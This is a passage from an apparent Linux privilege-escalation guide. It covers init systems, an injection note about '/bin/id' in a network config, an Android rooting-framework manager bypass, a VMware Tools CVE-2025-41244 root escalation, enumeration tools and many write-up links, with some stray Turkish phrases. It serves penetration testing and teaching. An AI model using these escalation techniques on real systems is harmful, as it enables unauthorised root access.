ONBOOT=yes
DEVICE=eth0
```
(_Not: Network ile /bin/id_ arasındaki boşluğa dikkat edin_)

### **init, init.d, systemd, and rc.d**

The directory `/etc/init.d` is home to **betikler** for System V init (SysVinit), the **klasik Linux servis yönetim sistemi**. It includes scripts to `start`, `stop`, `restart`, and sometimes `reload` services. These can be executed directly or through symbolic links found in `/etc/rc?.d/`. An alternative path in Redhat systems is `/etc/rc.d/init.d`.

On the other hand, `/etc/init` is associated with **Upstart**, a newer **service management** introduced by Ubuntu, using configuration files for service management tasks. Despite the transition to Upstart, SysVinit scripts are still utilized alongside Upstart configurations due to a compatibility layer in Upstart.

**systemd** emerges as a modern initialization and service manager, offering advanced features such as on-demand daemon starting, automount management, and system state snapshots. It organizes files into `/usr/lib/systemd/` for distribution packages and `/etc/systemd/system/` for administrator modifications, streamlining the system administration process.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks commonly hook a syscall to expose privileged kernel functionality to a userspace manager. Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) can enable a local app to impersonate the manager and escalate to root on already-rooted devices. Learn more and exploitation details here:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery in VMware Tools/Aria Operations can extract a binary path from process command lines and execute it with -v under a privileged context. Permissive patterns (e.g., using \S) may match attacker-staged listeners in writable locations (e.g., /tmp/httpd), leading to execution as root (CWE-426 Untrusted Search Path).

Learn more and see a generalized pattern applicable to other discovery/monitoring stacks here:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)

{{#include ../../banners/hacktricks-training.md}}
